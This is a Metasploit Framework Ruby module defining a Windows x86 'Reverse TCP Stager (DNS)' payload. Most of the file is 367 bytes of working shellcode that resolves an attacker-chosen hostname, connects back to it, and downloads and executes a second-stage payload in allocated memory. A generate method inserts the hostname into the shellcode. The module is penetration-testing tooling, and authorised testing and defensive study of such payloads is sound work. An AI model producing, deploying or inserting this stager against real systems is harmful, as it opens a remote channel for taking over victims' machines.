##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def self.handler_type_alias
		"reverse_tcp_dns"
	end

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager (DNS)',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to the attacker',
			'Author'        => ['hdm', 'skape', 'sf'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Convention'    => 'sockedi',
			'Stager'        =>
				{
					'RequiresMidstager' => false,
					'Offsets' => { 'LPORT' => [ 212, 'n' ], 'ReverseConnectRetries' => [ 207, 'C'] },
					'Payload' =>
						# Name: stager_reverse_tcp_dns
						# Length: 367 bytes
						# Port Offset: 212
						# HostName Offset: 248
						# RetryCounter Offset: 207
						# ExitFunk Offset: 237
						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
						"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
						"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
						"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
						"\xD5\x97\xEB\x2F\x68\xA9\x28\x34\x80\xFF\xD5\x8B\x40\x1C\x6A\x05" +
						"\x50\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\x99\xA5\x74" +
						"\x61\xFF\xD5\x85\xC0\x74\x51\xFF\x4E\x08\x75\xEC\x68\xF0\xB5\xA2" +
						"\x56\xFF\xD5\xE8\xCC\xFF\xFF\xFF\x58\x58\x58\x58\x58\x58\x58\x58" +
						"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
						"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
						"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
						"\x58\x58\x58\x58\x58\x58\x58\x00\x6A\x00\x6A\x04\x56\x57\x68\x02" +
						"\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A" +
						"\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68" +
						"\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"
				}
			))

		# Overload LHOST as a String value for the hostname
		register_options([
			OptString.new("LHOST", [true, "The DNS hostname to connect back to"])
		], self.class)
	end

	def generate
		p = super

		i = p.index("X" * 63)
		u = datastore['LHOST'].to_s + "\x00"
		raise ArgumentError, "LHOST can be 63 bytes long at the most" if u.length > 64
		p[i, u.length] = u
		p
	end

end

